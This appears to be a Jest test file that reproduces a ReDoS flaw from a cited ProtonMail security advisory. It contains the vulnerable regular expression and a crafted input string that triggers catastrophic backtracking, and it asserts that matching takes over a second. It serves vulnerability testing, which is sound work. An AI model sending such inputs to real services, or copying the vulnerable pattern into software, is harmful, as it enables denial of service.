// var attackString = "_= ;_= ;_=";

// var reg1 = /^(\s*(_[^;\s]*|addr|prefer-encrypt)\s*=\s*[^;\s]*\s*;)*\s*keydata\s*=([^;]*)$/;
// reg1.test(attackString);

//https://securitylab.github.com/advisories/GHSL-2021-027-redos-ProtonMail/
test("ReDos in ProtonMail ", () => {
    const uri = require("uri-js");
    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    
    var attackString = "_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_=";

    //var attackString = "_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_= ;_=";
    var reg1 = /^(\s*(_[^;\s]*|addr|prefer-encrypt)\s*=\s*[^;\s]*\s*;)*\s*keydata\s*=([^;]*)$/;

    let t = measureTime(function () {
        reg1.test(attackString);
    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
  